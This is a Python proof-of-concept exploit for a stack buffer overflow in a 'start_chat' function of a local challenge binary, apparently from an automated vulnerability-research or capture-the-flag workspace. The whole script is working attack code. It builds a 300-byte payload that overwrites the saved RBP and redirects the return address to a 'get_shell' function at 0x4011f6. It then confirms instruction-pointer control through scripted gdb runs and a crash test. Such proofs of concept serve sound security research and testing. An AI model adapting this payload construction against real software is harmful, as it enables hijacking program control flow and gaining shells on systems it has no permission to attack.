#!/usr/bin/env python3
"""
PoC for BUG-001: Stack Buffer Overflow in start_chat
Binary: /work/workspace/0032-2024-64-chatggt-20260909-223056/target

BUG: read(0, rbp-0x100, 0x12c) reads 300 bytes into 256-byte buffer.
     44-byte overflow overwrites saved RBP (offset 256) and return address (offset 264).

Primitives verified:
  PRIM-001: RIP_CONTROL  — return address overwritten with attacker-controlled value
  PRIM-002: STACK_CONTROL — saved RBP overwritten with attacker-controlled value
  PRIM-003: CRASH — overflow with invalid return address causes SIGSEGV

Usage: python3 poc-BUG-001.py [--gdb]
  Without --gdb: runs the binary directly, demonstrates crash (PRIM-003)
  With --gdb: uses gdb to verify RIP_CONTROL and STACK_CONTROL (PRIM-001, PRIM-002)
"""

import subprocess
import sys
import os

BINARY = "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"
WORKSPACE = "/work/workspace/0032-2024-64-chatggt-20260909-223056"

# Layout: buffer[0:256] | saved_rbp[256:264] | return_addr[264:272] | beyond[272:300]
BUFFER_SIZE = 256
OFFSET_RBP = 256
OFFSET_RET = 264
TOTAL = 300

GET_SHELL = 0x4011f6  # get_shell function address (non-PIE, fixed)

def build_payload(rbp_val, ret_val, prefix=b"EXIT"):
    """Build 300-byte overflow payload.
    prefix: first 4 bytes (must be 'EXIT' to break the loop and trigger leave;ret)
    rbp_val: 8-byte value to overwrite saved RBP
    ret_val: 8-byte value to overwrite return address
    """
    payload = prefix                          # [0:4]    - must be "EXIT" to break loop
    payload += b"B" * (OFFSET_RBP - 4)       # [4:256]  - fill buffer
    payload += rbp_val.to_bytes(8, 'little')  # [256:264] - overwrite saved RBP
    payload += ret_val.to_bytes(8, 'little')  # [264:272] - overwrite return address
    payload += b"E" * (TOTAL - len(payload)) # [272:300] - fill remaining
    assert len(payload) == TOTAL, f"Payload length {len(payload)} != {TOTAL}"
    return payload


def prim_003_crash():
    """PRIM-003: CRASH — overflow with invalid return address causes SIGSEGV"""
    print("=== PRIM-003: Testing CRASH (invalid return address) ===")
    payload = build_payload(rbp_val=0x4343434343434343, ret_val=0x4444444444444444)
    result = subprocess.run(
        [BINARY],
        input=payload,
        capture_output=True,
        timeout=10
    )
    rc = result.returncode
    # SIGSEGV = signal 11, so return code should be -11 or 139 (128+11)
    print(f"  Return code: {rc}")
    print(f"  Signal: {-rc if rc < 0 else rc - 128}")
    if rc < 0:
        sig = -rc
    elif rc > 128:
        sig = rc - 128
    else:
        sig = 0
    if sig == 11:  # SIGSEGV
        print(f"  === PRIM-003: VERIFIED — SIGSEGV (signal 11) from corrupted return address ===")
        return True
    else:
        print(f"  === PRIM-003: PARTIAL — return code {rc}, expected SIGSEGV ===")
        return False


def prim_001_002_gdb():
    """PRIM-001: RIP_CONTROL + PRIM-002: STACK_CONTROL via gdb verification"""
    print("=== PRIM-001: Testing RIP_CONTROL (return address = get_shell 0x4011f6) ===")
    print("=== PRIM-002: Testing STACK_CONTROL (saved RBP = 0x4343434343434343) ===")

    payload = build_payload(
        rbp_val=0x4343434343434343,  # CCCCCCCC
        ret_val=GET_SHELL             # 0x4011f6
    )
    payload_file = os.path.join(WORKSPACE, "payload_gdb_verify")
    with open(payload_file, "wb") as f:
        f.write(payload)

    # gdb commands: break at ret instruction, run, check registers, step past ret
    gdb_args = [
        "gdb", "-q", "-batch",
        "-ex", "b *0x401300",
        "-ex", f"run < {payload_file}",
        "-ex", "info registers rip rsp rbp",
        "-ex", "x/4gx $rsp",
        "-ex", "stepi",
        "-ex", "info registers rip rbp rsp",
        BINARY
    ]

    result = subprocess.run(
        gdb_args,
        capture_output=True,
        text=True,
        timeout=15
    )

    output = result.stdout + result.stderr
    print("  [gdb output excerpt]")
    for line in output.split('\n'):
        if any(k in line for k in ['rip', 'rbp', 'rsp', '0x7fff', 'Breakpoint', 'get_shell', 'SIGSEGV']):
            print(f"    {line}")

    # Check for RIP_CONTROL: after stepi, RIP should be 0x4011f6 (get_shell)
    rip_control_ok = "0x00000000004011f6" in output and "get_shell" in output
    # Check for STACK_CONTROL: RBP should be 0x4343434343434343
    stack_control_ok = "0x4343434343434343" in output

    if rip_control_ok:
        print(f"  === PRIM-001: VERIFIED — RIP = 0x{GET_SHELL:x} (get_shell) after ret, attacker-controlled ===")
    else:
        print(f"  === PRIM-001: FAILED — RIP did not match expected value ===")

    if stack_control_ok:
        print(f"  === PRIM-002: VERIFIED — RBP = 0x4343434343434343 (attacker-controlled) after leave ===")
    else:
        print(f"  === PRIM-002: FAILED — RBP did not match expected value ===")

    return rip_control_ok, stack_control_ok


def prim_001_gdb_alt():
    """PRIM-001 additional: verify with a DIFFERENT target address (0xdeadbeef41414141)
    to prove the address is fully attacker-controlled (not a coincidence)."""
    print("=== PRIM-001 (alt): Testing RIP_CONTROL with different address 0xdeadbeef41414141 ===")

    payload = build_payload(
        rbp_val=0x4343434343434343,
        ret_val=0xdeadbeef41414141
    )
    payload_file = os.path.join(WORKSPACE, "payload_gdb_alt")
    with open(payload_file, "wb") as f:
        f.write(payload)

    gdb_args2 = [
        "gdb", "-q", "-batch",
        "-ex", "b *0x401300",
        "-ex", f"run < {payload_file}",
        "-ex", "x/2gx $rsp",
        BINARY
    ]

    result = subprocess.run(
        gdb_args2,
        capture_output=True,
        text=True,
        timeout=15
    )

    output = result.stdout + result.stderr
    for line in output.split('\n'):
        if '0x7fff' in line or 'Breakpoint' in line:
            print(f"    {line}")

    alt_ok = "0xdeadbeef41414141" in output
    if alt_ok:
        print(f"  === PRIM-001 (alt): VERIFIED — return address slot = 0xdeadbeef41414141 (second distinct value) ===")
    else:
        print(f"  === PRIM-001 (alt): FAILED ===")
    return alt_ok


if __name__ == "__main__":
    use_gdb = "--gdb" in sys.argv

    if use_gdb:
        # Full verification with gdb
        rip_ok, stack_ok = prim_001_002_gdb()
        print()
        alt_ok = prim_001_gdb_alt()
        print()
    else:
        rip_ok = stack_ok = alt_ok = False

    # Always run crash test
    crash_ok = prim_003_crash()
    print()

    print("=== Summary ===")
    if use_gdb:
        print(f"  PRIM-001 (RIP_CONTROL):    {'VERIFIED' if rip_ok else 'FAILED'}")
        print(f"  PRIM-002 (STACK_CONTROL):  {'VERIFIED' if stack_ok else 'FAILED'}")
        print(f"  PRIM-001 alt (2nd addr):   {'VERIFIED' if alt_ok else 'FAILED'}")
    print(f"  PRIM-003 (CRASH):          {'VERIFIED' if crash_ok else 'FAILED'}")
